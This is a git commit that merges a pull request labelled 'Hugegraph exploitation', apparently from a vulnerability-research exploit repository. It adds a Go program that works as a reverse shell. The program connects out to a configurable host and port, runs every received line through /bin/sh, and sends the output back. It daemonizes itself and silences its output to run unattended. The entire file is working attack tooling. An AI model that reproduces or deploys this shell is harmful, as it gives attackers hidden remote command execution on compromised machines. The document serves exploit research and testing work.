4fa224bbee8ddbb3a6223b11bd1e3fc64224b15b
Jacob Baines <113205286+j-baines@users.noreply.github.com>
2024-06-05 14:23:25 -0400

    Merge pull request #651 from vulncheck/hugegraph
    #645 Hugegraph exploitation
    
    GitOrigin-RevId: 6688fd0610cc21d1a2de0d664754745bd46bfdb3

---
+++ shells/linux/basicsh/reverse_shell.go
@@ -0,0 +1,74 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+	"syscall"
+)
+
+var (
+	// the address to connect back to
+	Rshost = "127.0.0.1"
+	// the port to connect back to
+	Rsport = "8080"
+)
+
+func doShell() {
+	conn, err := net.Dial("tcp", Rshost+":"+Rsport)
+	if err != nil {
+		fmt.Println(err)
+
+		return
+	}
+
+	reader := bufio.NewReader(conn)
+	for {
+		userCmd, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Println(err)
+
+			return
+		}
+		if strings.TrimRight(userCmd, "\n") == "exit" {
+			conn.Close()
+
+			return
+		}
+		cmd := exec.Command("/bin/sh", "-c", userCmd)
+		out, _ := cmd.CombinedOutput()
+		_, _ = conn.Write(out)
+	}
+}
+
+func daemonize() {
+	if _, err := syscall.Setsid(); err != nil {
+		os.Exit(1)
+	}
+
+	devNull, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
+	if err != nil {
+		os.Exit(1)
+	}
+	_ = syscall.Dup3(int(devNull.Fd()), int(os.Stdin.Fd()), 0)
+	_ = syscall.Dup3(int(devNull.Fd()), int(os.Stdout.Fd()), 0)
+	_ = syscall.Dup3(int(devNull.Fd()), int(os.Stderr.Fd()), 0)
+
+	doShell()
+}
+
+func main() {
+	if len(os.Args) > 1 {
+		daemonize()
+
+		return
+	}
+
+	// just add any old value to indicate that we want to fork
+	cmd := exec.Command(os.Args[0], "a")
+	_ = cmd.Start()
+	os.Exit(0)
+}
